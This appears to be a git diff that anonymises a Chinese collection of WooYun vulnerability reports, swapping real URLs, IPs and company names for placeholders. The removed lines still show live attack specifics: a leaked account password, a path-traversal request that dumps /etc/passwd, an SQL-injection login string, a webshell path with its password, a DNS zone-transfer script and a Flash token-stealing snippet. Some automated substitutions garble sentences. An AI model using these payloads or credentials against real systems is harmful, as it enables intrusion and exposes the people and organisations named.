-**POC**: http://www.ku6.com/?account=z439912678@163.com&expire=on&password=Zhao521%2B.%3F&x=0&y=0账号:z439912678@163.com密码:Zhao521+.?
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -17772,8 +17772,8 @@
 ---
 
 ---
-### [wooyun-2011-01720] 腾讯世博目录权限分配不当
-**厂商**: 腾讯 | **年份**: 2011 | **类型**: 系统/服务运维配置不当
+### [wooyun-2011-01720] 某互联网公司世博目录权限分配不当
+**厂商**: 某互联网公司 | **年份**: 2011 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -17786,7 +17786,7 @@
 
 **详情**: 对目录权限设置的不正确
 
-**POC**: http://2010.qq.com/a/
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -17806,7 +17806,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://cr.ctbu.edu.cn/ dedecms recommend注入http://cif.ctbu.edu.cn/ dedecms recommend注入这两台服务器都存在nginx解析漏洞
+**详情**: https://example.com/[已脱敏] dedecms recommend注入https://example.com/[已脱敏] dedecms recommend注入这两台服务器都存在nginx解析漏洞
 
 **POC**: (见原文)
 
@@ -17830,7 +17830,7 @@
 
 **详情**: 西安翻译学院
 
-**POC**: 西安翻译学院服务器开启Guest无需密码直接进入,影响众多权重站服务器开启了guest，不用密码就直接进入服务器了，可有权限操作，影响多个站点。这安全做的。。。我也是醉了服务器IP：59.75.8.96直接链接用户名：Guest无需密码登录服务器就这样的。。。发现入侵痕迹，几枚shell，已删除。这安全做的，我等也是醉了
+**POC**: 西安翻译学院服务器开启Guest无需密码直接进入,影响众多权重站服务器开启了guest，不用密码就直接进入服务器了，可有权限操作，影响多个站点。这安全做的。。。我也是醉了服务器IP：[IP已脱敏]直接链接用户名：Guest无需密码登录服务器就这样的。。。发现入侵痕迹，几枚shell，已删除。这安全做的，我等也是醉了
 
 **绕过**: 直接利用
 
@@ -17850,9 +17850,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: inurl:http://my.caissa.com.cn/Order/ViewTeamOrder.aspx?orderCode=http://my.caissa.com.cn/Order/ViewTeamOrder.aspx?orderCode=W201503140167732http://my.caissa.com.cn/Order/ViewTeamOrder.aspx?orderCode=W201504120172544
+**详情**: inurl:https://example.com/[已脱敏]
 
-**POC**: http://my.caissa.com.cn/Order/ViewTeamOrder.aspx?orderCode=W201504060171446http://my.caissa.com.cn/Order/ViewTeamOrder.aspx?orderCode=W201504120172544
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -17938,13 +17938,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 42.96.148.157 MongoDB 服务器配置不当
+**详情**: [IP已脱敏] MongoDB 服务器配置不当
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: 参考 MongoDB安全配置 http://drops.wooyun.org/tips/2470
+**修复**: 参考 MongoDB安全配置 https://example.com/[已脱敏]
 ---
 
 ---
@@ -17960,7 +17960,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://jc.ourgame.com/WEB-INF/web.xmlhttp://gdap.ourgame.com/WEB-INF/web.xml
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -17982,7 +17982,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: JBoss控制台存在严重安漏洞，允许用户上传安装war脚本程序包。关于此漏洞请参考：http://tech.ccidnet.com/art/1099/20100111/1977341_1.html上班不方便看，你们检查一下吧。
+**详情**: JBoss控制台存在严重安漏洞，允许用户上传安装war脚本程序包。关于此漏洞请参考：https://example.com/[已脱敏]
 
 **POC**: 修复方案：给jmx-console加上访问密码1.在 ${jboss.server.home.dir}/deploy下面找到jmx-console.war目录编辑WEB-INF/web.xml文件 去掉 security-constraint 块的注释，使其起作用2.编辑WEB-INF/classes/jmx-console-users.properties或server/default/conf /props/jmx-console-users.properties (version >=4.0.2)和 WEB-INF/classes/jmx-console-roles.properties
 
@@ -18026,7 +18026,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: C:\Users\Administrator>nslookup -qt=txt pbccrc.org.cn服务器:  public1.114dns.comAddress:  114.114.114.114pbccrc.org.cnprimary name server = ns1.sdc.org.cnresponsible mail addr = rdns.conac.cnserial  = 1449223061refresh = 28800 (8 hours)retry   = 14400 (4 hours)expire  = 604800 (7 days)default TTL = 28800 (8 hours)缺少spf参数SPF是跟DNS相关的一项技术，它的内容写在DNS的txt类型的记录里面。SPF的作用跟mx相反，它向收信者表明，哪些邮件服务器是经过某个域名认可会发送邮件的。具
+**详情**: C:\Users\Administrator>nslookup -qt=txt pbccrc.org.cn服务器:  public1.114dns.comAddress:  [IP已脱敏]pbccrc.org.cnprimary name server = ns1.sdc.org.cnresponsible mail addr = rdns.conac.cnserial  = 1449223061refresh = 28800 (8 hours)retry   = 14400 (4 hours)expire  = 604800 (7 days)default TTL = 28800 (8 hours)缺少spf参数SPF是跟DNS相关的一项技术，它的内容写在DNS的txt类型的记录里面。SPF的作用跟mx相反，它向收信者表明，哪些邮件服务器是经过某个域名认可会发送邮件的。具
 
 **POC**: (见原文)
 
@@ -18048,7 +18048,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 魔秀IP：111.206.163.76  SNMP漏洞哦了.
+**详情**: 魔秀IP：[IP已脱敏]  SNMP漏洞哦了.
 
 **POC**: ···
 
@@ -18092,7 +18092,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://cw.zhangqiu.gov.cn:8081/weblogin/ 首先是遍历漏洞http://cw.zhangqiu.gov.cn:8081/weblogin/login.aspx 后台登陆http://cw.zhangqiu.gov.cn:8081/weblogin/loginUser/pLoginUserList.aspx部分密码泄露这个要被某人利用了，我们农名工好不容易举报的贪官然后让“黑手党”给删除了这多不公道啊！
+**详情**: https://example.com/[已脱敏] 首先是遍历漏洞https://example.com/[已脱敏] 后台登陆https://example.com/[已脱敏]
 
 **POC**: 泄露的秘密某个账户里面的举报信我们农民工举报的贪官
 
@@ -18136,7 +18136,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.the9.com/fanta/ctl_award.php?action=indexhttp://www.the9.com/gem/mu1.php
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 看看吧
 
@@ -18158,7 +18158,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 又一发，上一发依然没给邀请码。。。WOOYUN的邀请码这么难。。通过网站路径扫描和路径猜测可获得主要的两个路径http://air.fjemc.org.cn/sys/http://air.fjemc.org.cn/files/
+**详情**: 又一发，上一发依然没给邀请码。。。WOOYUN的邀请码这么难。。通过网站路径扫描和路径猜测可获得主要的两个路径https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -18224,7 +18224,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://218.75.127.195:808/xOA/admin'OR'a'='a后台存在视屏监控 （海康威视）随便找了一个 admin 12345请全面检查
+**详情**: http://[IP已脱敏] （海康威视）随便找了一个 admin 12345请全面检查
 
 **POC**: (见原文)
 
@@ -18312,7 +18312,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://210.75.206.8 北京市社区公共服务信息网某站点某服务器设置不当，导致存在iis写权限利用漏洞，可直接写入
+**详情**: http://[IP已脱敏] 北京市社区公共服务信息网某站点某服务器设置不当，导致存在iis写权限利用漏洞，可直接写入
 
 **POC**: (见原文)
 
@@ -18334,7 +18334,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://dcncs.digitalchina.com神州数码客户服务系统应用配置错误由于管理员的疏忽，我们可以查看目录，看到bin的目录http://dcncs.digitalchina.com/database/数据库的目录，都可以下载下来，我这里没有下载你们的数据，我只不过友情检测一下！没有做任何的破坏，谢谢！http://dcncs.digitalchina.com/log/  日志的目录日志，可以看到很多用户信息15:12:27] [INFO] fetching number of databases[15:12:27] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[15:12:27] [INFO]
+**详情**: https://example.com/[已脱敏]  日志的目录日志，可以看到很多用户信息15:12:27] [INFO] fetching number of databases[15:12:27] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[15:12:27] [INFO]
 
 **POC**: 同上
 
@@ -18400,7 +18400,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 目录浏览http://ebast.zte.com.cn/filesrepository/http://ebast.zte.com.cn/filesrepository/112233/TI2G/HOT11223344-2011-04-TI2G-0023/112233-BAUT-170720111842.htm另外一个站https://210.21.223.37/eAgent/Application/
+**详情**: 目录浏览https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -18422,9 +18422,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://218.26.195.158:80/	Microsoft-IIS/6.0存在iis可写漏洞山西省忻州市林业局
+**详情**: http://[IP已脱敏]	Microsoft-IIS/6.0存在iis可写漏洞山西省忻州市林业局
 
-**POC**: http://218.26.195.158/20141111091150.asp;.txt密码z
+**POC**: http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -18444,9 +18444,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 中国大地保险某站修复不当仍存在JAVA反序列化漏洞地址：http://222.73.173.5:7001/测试如下
+**详情**: 中国大地保险某站修复不当仍存在JAVA反序列化漏洞地址：http://[IP已脱敏]
 
-**POC**: 中国大地保险某站修复不当仍存在JAVA反序列化漏洞地址：http://222.73.173.5:7001/测试如下
+**POC**: 中国大地保险某站修复不当仍存在JAVA反序列化漏洞地址：http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -18466,7 +18466,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://22do.lehuo.sohu.com/images/szbg02.gif/c.php
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -18510,9 +18510,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 官网：http://duia.com/地址：http://106.39.118.131/http://106.39.118.131/aaa.jpg
+**详情**: 官网：https://example.com/[已脱敏]
 
-**POC**: 全站备份：http://106.39.118.131/duia.tar.gz数据库备份泄露：http://106.39.118.131/123/数据量太大了，没有进一步测试，请尽快修复。
+**POC**: 全站备份：http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -18586,8 +18586,8 @@
 ---
 
 ---
-### [wooyun-2013-017060] 淘宝网某频道管理后台泄漏
-**厂商**: 淘宝网 | **年份**: 2013 | **类型**: 系统/服务运维配置不当
+### [wooyun-2013-017060] 某电商平台网某频道管理后台泄漏
+**厂商**: 某电商平台网 | **年份**: 2013 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -18598,7 +18598,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 淘宝网读书小镇首页生成管理平台，无需任何权限验证直接进入操作。http://www.taobao.com/go/act/readtown/admin.php
+**详情**: 某电商平台网读书小镇首页生成管理平台，无需任何权限验证直接进入操作。https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -18620,9 +18620,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 模版静态资源上传页面（http://www.diandian.comhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/asset）和Flash跨域通信的配置文件中（http://www.diandain.com/crossdomain.xml）允许的域名相同，只需上传一个SWF，就可以读到formKey了。把这SWF嵌入到blog页面中，读到访客的formKey，调用externalInterface把值给输到JS里，又能worm了吧。
+**详情**: 模版静态资源上传页面（https://example.com/[已脱敏]
 
-**POC**: http://x.libdd.com/farm1/f15341/7cef03a1/diandian.swfvar result_txt = new TextField();result_txt.x = 0;result_txt.y = 0;result_txt.height = 22;result_txt.width = 200;addChild(result_txt);var targetURL:String="http://www.diandian.com/home";var request:URLRequest=new URLRequest(targetURL);request.meth
+**POC**: https://example.com/[已脱敏] result_txt = new TextField();result_txt.x = 0;result_txt.y = 0;result_txt.height = 22;result_txt.width = 200;addChild(result_txt);var targetURL:String="https://example.com/[已脱敏]";var request:URLRequest=new URLRequest(targetURL);request.meth
 
 **绕过**: 直接利用
 
@@ -18686,7 +18686,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.抓乌云厂商域名,抓后使用grep awk把域名提取出来,excel分列功能也可以，略过。#!/bin/bashfor ((i=1;i<24;i++))docurl http://www.wooyun.org/corps/page/$i|grep nofollow >> wooyun.txtdone2.测试是否存在域传送#!/bin/bashwhile read onelinedoNS=`dig ${oneline} +nssearch|head -1|awk '{printf $2}'` #取DNS服务器dig @${NS} ${oneline} axfr  >> dns.txtdone < wooyun.org.txt  #厂商列表
+**详情**: 1.抓乌云厂商域名,抓后使用grep awk把域名提取出来,excel分列功能也可以，略过。#!/bin/bashfor ((i=1;i<24;i++))docurl https://example.com/[已脱敏] nofollow >> wooyun.txtdone2.测试是否存在域传送#!/bin/bashwhile read onelinedoNS=`dig ${oneline} +nssearch|head -1|awk '{printf $2}'` #取DNS服务器dig @${NS} ${oneline} axfr  >> dns.txtdone < wooyun.org.txt  #厂商列表
 
 **POC**: (见原文)
 
@@ -18708,7 +18708,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: IIS配置不当，直接put上传一句话。3389登录服务器才发现原来是盛大的站。当时一登录服务器我就把webdav禁止了，算是防止二次入侵吧。1 描述：榛樿缃戠珯主机头：2 描述：Gplus主机头：Gplus.sdptest.sdo.com3 描述：MerchantcontorlPro-NEW主机头：pronew.shengpay.com4 描述：PaymentWebService主机头：5 描述：test.igw.jf.sdo.com主机头：igwjf.sdptest.sdo.com6 描述：OA_Service主机头：7 描述：Merchantrefundnotify主机头：8 描述：SJMerchantCenter主机头：10.132.19.189 描述：PayHTML5主机头：coupon-api.sdptest.shengpay.com 10.132.19.1810 描述：mer
+**详情**: IIS配置不当，直接put上传一句话。3389登录服务器才发现原来是盛大的站。当时一登录服务器我就把webdav禁止了，算是防止二次入侵吧。1 描述：榛樿缃戠珯主机头：2 描述：Gplus主机头：Gplus.sdptest.sdo.com3 描述：MerchantcontorlPro-NEW主机头：pronew.shengpay.com4 描述：PaymentWebService主机头：5 描述：test.igw.jf.sdo.com主机头：igwjf.sdptest.sdo.com6 描述：OA_Service主机头：7 描述：Merchantrefundnotify主机头：8 描述：SJMerchantCenter主机头：[IP已脱敏] 描述：PayHTML5主机头：coupon-api.sdptest.shengpay.com [IP已脱敏]0 描述：mer
 
 **POC**: (见原文)
 
@@ -18752,7 +18752,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 昆明航空飞行网上准备系统http://113.108.100.168/
+**详情**: 昆明航空飞行网上准备系统http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -18796,9 +18796,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 厂商网站：http://170web.com/cases_01.html在成功案例中随便找几个测试下该系统数据库默认保存在/data/%23data.mdb  目录下将#编码成%23 就可以直接下载网站数据库。如果数据库有备份，则备份路径为 /data/backup/dbback.mdb以 http://e-ton.cn/data/%23data.mdb 为例。直接下载下来数据库登录后台
+**详情**: 厂商网站：https://example.com/[已脱敏]  目录下将#编码成%23 就可以直接下载网站数据库。如果数据库有备份，则备份路径为 /data/backup/dbback.mdb以 https://example.com/[已脱敏] 为例。直接下载下来数据库登录后台
 
-**POC**: 其他测试案例：http://liangjialiangzm.com/data/%23data.mdbhttp://www.zscredit.cc/data/%23data.mdbhttp://znfjf.com/data/%23data.mdbhttp://mastino.com.cn/data/%23data.mdbhttp://youd.cc/youd/data/%23data.mdb
+**POC**: 其他测试案例：https://example.com/[已脱敏]
 
 **绕过**: 编码绕过
 
@@ -18818,13 +18818,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 在土豆网的动漫频道存在游戏频道的广告链接，点击链接跳转至游戏频道游戏主题页面，而该游戏主题页面应该是已经被删除，所以服务器对该错误页面进行URL重置跳转，由于配置错误导致本该跳转至http://game.tudou.com/而实际上跳转到了http://game.tuduo.com/，而该域名处于未使用状态，如果被恶意使用，将导致土豆网用户“被官网”钓鱼。
+**详情**: 在土豆网的动漫频道存在游戏频道的广告链接，点击链接跳转至游戏频道游戏主题页面，而该游戏主题页面应该是已经被删除，所以服务器对该错误页面进行URL重置跳转，由于配置错误导致本该跳转至https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: 修改在处理错误页面进行URL重置跳转时的目标地址为http://game.tudou.com/
+**修复**: 修改在处理错误页面进行URL重置跳转时的目标地址为https://example.com/[已脱敏]
 ---
 
 ---
@@ -18840,7 +18840,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: > server leiphone.comDefault Server:  leiphone.comAddress:  113.106.88.130> ls leiphone.com[leiphone.com]leiphone.com.                  NS     server = ns2.leiphone.comleiphone.com.                  NS     server = ns3.leiphone.comleiphone.com.                  A      113.106.88.130a                              A      113.106.88.130ns2                            NS     server = s1.leiphone.comns3
+**详情**: > server leiphone.comDefault Server:  leiphone.comAddress:  [IP已脱敏]> ls leiphone.com[leiphone.com]leiphone.com.                  NS     server = ns2.leiphone.comleiphone.com.                  NS     server = ns3.leiphone.comleiphone.com.                  A      [IP已脱敏]a                              A      [IP已脱敏]ns2                            NS     server = s1.leiphone.comns3
 
 **POC**: (见原文)
 
@@ -18862,7 +18862,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://zssj.lib.sjtu.edu.cn/wwwroot.rar整站源代码被下载然后可找到数据库中的后台密码成功进入后台危害很大
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -18886,7 +18886,7 @@
 
 **详情**: 先来张成功图：
 
-**POC**: 1、用户在登录时输入的手机号及身份证号在Logcat中明文显示。2、手机接收的验证码在Logcat中显示。3、输入验证码及密码修改成功。4、apk下载地址。http://apk.r1.market.hiapk.com/datahttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/2015/01_30/18/howbuy.android.piggy_182047.apk
+**POC**: 1、用户在登录时输入的手机号及身份证号在Logcat中明文显示。2、手机接收的验证码在Logcat中显示。3、输入验证码及密码修改成功。4、apk下载地址。https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -18906,7 +18906,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://116.113.82.132:8222/存在iis写权限漏洞先put再move导致整站沦陷
+**详情**: http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -18928,9 +18928,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: [root@localhost ~]# curl http://117.79.150.240/../../../../../../../../../../../../../etc/passwdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinuucp:x:10:14:
+**详情**: [root@localhost ~]# curl http://[IP已脱敏]
 
-**POC**: [root@localhost ~]# curl http://117.79.150.240/../../../../../../../../../../../../../etc/passwdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin
+**POC**: [root@localhost ~]# curl http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -18972,7 +18972,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 地址：http://ploy.infobird.com:8080/ploy/code/config.ini登陆系统：http://ploy.infobird.com/
+**详情**: 地址：https://example.com/[已脱敏]
 
 **POC**: 成功登陆：
 
@@ -19016,7 +19016,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 视频：http://yunpan.cn/cmYW4UHdgRT2M  访问密码 4115尼玛，没几分钟280多兆。问题出在酷开系统与电视派上。酷开电视系统默认安装电视派。用户可以在手机上安装电视派，将手机当作控制器。可推送视频，音乐，图片。恢复出厂设置。但是电视连接上电视只是会提示说什么什么设备已连接。而且这个设备名称还可以伪造。也没告诉电视用户怎么断开。测试的是最新系统。老系统也存在该问题。电视派APK下载地址：http://yunpan.cn/cmY5vHsqkPZ8J  访问密码 20ee大牛可以逆向下。
+**详情**: 视频：https://example.com/[已脱敏]  访问密码 4115尼玛，没几分钟280多兆。问题出在酷开系统与电视派上。酷开电视系统默认安装电视派。用户可以在手机上安装电视派，将手机当作控制器。可推送视频，音乐，图片。恢复出厂设置。但是电视连接上电视只是会提示说什么什么设备已连接。而且这个设备名称还可以伪造。也没告诉电视用户怎么断开。测试的是最新系统。老系统也存在该问题。电视派APK下载地址：https://example.com/[已脱敏]  访问密码 20ee大牛可以逆向下。
 
 **POC**: (见原文)
 
@@ -19040,7 +19040,7 @@
 
 **详情**: 美丽说某处配置不当，导致分站源码泄漏
 
-**POC**: http://b.higo.meilishuo.com/.git/config使用lijijie的githackhttps://github.com/lijiejie/GitHack获取网站源码
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -19060,7 +19060,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 刚开始看到有小伙伴提交这个站的漏洞，有个注入，https://tender.wanda.cn/COST/WebService_N/CMWCost/CMWContractVOWebService.asmx，调用的2个byname的service都有注入，想着如果只修补了一个，还能捡个漏，结果修复了一个注入，另一个byname的service直接去掉了。机智！https://vendor.wanda.cn/tender/home.aspx首先是iis短文件名枚举漏洞。https://vendor.wanda.cn/tender/发现有个WDTMX1~.RAR文件WDTMX12.rar,WDTMX1402.rar WDTMX140212.rar?照着这个思路fuzz，10-14,1001-1412,100101-141231都不行，过了几天WDTMX1.rar没了，管理员好机智。。。随后又发现了
+**详情**: 刚开始看到有小伙伴提交这个站的漏洞，有个注入，https://example.com/[已脱敏] WDTMX140212.rar?照着这个思路fuzz，10-14,1001-1412,100101-141231都不行，过了几天WDTMX1.rar没了，管理员好机智。。。随后又发现了
 
 **POC**: (见原文)
 
@@ -19082,7 +19082,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 问题站点：http://112.25.58.6:1988/直接访问没有限制，泄露了主机的cpu、ram、硬盘分区等信息可以看到硬盘信息和主机信息，泄露咯！！
+**详情**: 问题站点：http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -19126,9 +19126,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 目标系统http://mis.hongfa.com/问题原因，fck编辑器配置不当，虽然无法上传，但可以遍历全磁盘文件http://mis.hongfa.com/admin/fckeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=File&CurrentFolder=/C:
+**详情**: 目标系统https://example.com/[已脱敏]
 
-**POC**: D盘http://mis.hongfa.com/admin/fckeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=File&CurrentFolder=/D:E盘
+**POC**: D盘https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -19202,8 +19202,8 @@
 ---
 
 ---
-### [wooyun-2010-0652] 腾讯某分站后台路径泄漏
-**厂商**: 腾讯 | **年份**: 2010 | **类型**: 应用配置错误
+### [wooyun-2010-0652] 某互联网公司某分站后台路径泄漏
+**厂商**: 某互联网公司 | **年份**: 2010 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 后台管理
 
@@ -19216,7 +19216,7 @@
 
 **详情**: 网站中有一些敏感文件或敏感目录因此泄露后台路径，可能导致网站被入侵。
 
-**POC**: 在站点跟目录提交electronbookhttp://adver.qq.com/electronbookWarning: opendir(/home/admin/zb_html/content/content/trunk/s/electronbook/electronbook) [function.opendir]: failed to open dir: No such file or directory in /home/admin/zb_html/content/content/library/Nuit/AdminMarketdata/Util.php on line 235Warnin
+**POC**: 在站点跟目录提交electronbookhttps://example.com/[已脱敏] opendir(/home/admin/zb_html/content/content/trunk/s/electronbook/electronbook) [function.opendir]: failed to open dir: No such file or directory in /home/admin/zb_html/content/content/library/Nuit/AdminMarketdata/Util.php on line 235Warnin
 
 **绕过**: 直接利用
 
@@ -19346,7 +19346,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 背景介绍：2015 年 7 月 28 日，世界上应用最广泛的 DNS 服务器 bind9 爆出了一个严重的拒绝服务漏洞（CVE-2015-5477）。参考链接：https://ring0.me/2015/08/exploit-dns-server-with-one-packet/漏洞测试过程：利用dig命令查询dajie.com的DNS信息发现大街有两台dns，对应的IP地址211.151.116.20-21查询DNS服务器版本信息利用ns1.dajie.com进行解析测试向ns1.dajie.com发送攻击PAYLOAD再次利用ns1.dajie.com进行解析测试，这时候服务已经挂了
+**详情**: 背景介绍：2015 年 7 月 28 日，世界上应用最广泛的 DNS 服务器 bind9 爆出了一个严重的拒绝服务漏洞（CVE-2015-5477）。参考链接：https://example.com/[已脱敏]
 
 **POC**: 漏洞测试过程：利用dig命令查询dajie.com的DNS信息发现大街有两台dns，对应的IP地址211.151.116.20-21查询DNS服务器版本信息利用ns1.dajie.com进行解析测试向ns1.dajie.com发送攻击PAYLOAD再次利用ns1.dajie.com进行解析测试，这时候服务已经挂了
 
@@ -19356,8 +19356,8 @@
 ---
 
 ---
-### [wooyun-2012-07649] 百度bae爆出同一web容器下的所有云应用域名
-**厂商**: 百度 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
+### [wooyun-2012-07649] 某搜索引擎bae爆出同一web容器下的所有云应用域名
+**厂商**: 某搜索引擎 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -19414,7 +19414,7 @@
 
 **详情**: 富士施乐智能打印机默认配置不当，打印机默认开启端口如下：打印机默认是以LPD方式进行打印，LPD它的功能是等待接受客户使用行式打印机远程（LPR）协议传来的打印工作。当LPD收到一个打印任务后，它先将打印任务暂存于打印队列中，打印队列是一个文件子目录，其中有许多打印工作等待LPD进行处理。当打印设备空闲时，LPD从打印队列中取出打印任务并将它传给打印机进行打印。但是实际上，可以通过Port9100和FTP服务进行打印。默认打印机配置是不对IP地址进行限制的，而且也存在默认账户口令用户名：11111密码：x-admin首先先说Port9100Port9100也是一种默认的打印流协议端口，但是富士施乐打印机默认并不会对Port9100端口进行限制，而暴露在公网上的打印机则可以通过远程的方式进行打印（附POC），通过向Port9100端口传输信息即可实现打印。Ftp服务默认状态下也是开启的，之前
 
-**POC**: zoomeye上还是很多的，远程打印机设备目前测试来看，不论啥具体型号~只要是远程的富士施乐设备，就有这个问题~~~然后还有一个问题！EPSON的某些打印机使用的跟富士施乐的一样的系统~是的，端口也一样！也有这个问题，百度了一下这也不是一家啊，感觉可能是一个通用的问题？
+**POC**: zoomeye上还是很多的，远程打印机设备目前测试来看，不论啥具体型号~只要是远程的富士施乐设备，就有这个问题~~~然后还有一个问题！EPSON的某些打印机使用的跟富士施乐的一样的系统~是的，端口也一样！也有这个问题，某搜索引擎了一下这也不是一家啊，感觉可能是一个通用的问题？
 
 **绕过**: 直接利用
 
@@ -19422,8 +19422,8 @@
 ---
 
 ---
-### [wooyun-2012-04484] 百度客户考试系统后台可访问
-**厂商**: 百度 | **年份**: 2012 | **类型**: 应用配置错误
+### [wooyun-2012-04484] 某搜索引擎客户考试系统后台可访问
+**厂商**: 某搜索引擎 | **年份**: 2012 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -19434,7 +19434,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://123.125.115.31/changetomanager.do;jsessionid=0AA5394C9367CDF745143278970D9D53.worker2_sem
+**详情**: http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -19456,7 +19456,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 新东方在线DNS传送漏洞http://www.koolearn.com/C:\Documents and Settings\Administrator>nslookupDefault Server:  google-public-dns-a.google.comAddress:  8.8.8.8> set type=ns> koolearn.comServer:  google-public-dns-a.google.comAddress:  8.8.8.8Non-authoritative answer:koolearn.com    nameserver = ns.koolearn.comkoolearn.com    nameserver = ns2.koolearn.com> server ns.koolearn.comDefault Server:  ns.koolearn.co
+**详情**: 新东方在线DNS传送漏洞https://example.com/[已脱敏] and Settings\Administrator>nslookupDefault Server:  google-public-dns-a.google.comAddress:  [IP已脱敏]> set type=ns> koolearn.comServer:  google-public-dns-a.google.comAddress:  [IP已脱敏]Non-authoritative answer:koolearn.com    nameserver = ns.koolearn.comkoolearn.com    nameserver = ns2.koolearn.com> server ns.koolearn.comDefault Server:  ns.koolearn.co
 
 **POC**: >ls koolearn.com
 
@@ -19466,8 +19466,8 @@
 ---
 
 ---
-### [wooyun-2013-040352] 阿里巴巴一处域名配置错误可导致钓鱼
-**厂商**: 阿里巴巴 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2013-040352] 某电商平台一处域名配置错误可导致钓鱼
+**厂商**: 某电商平台 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -19478,9 +19478,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
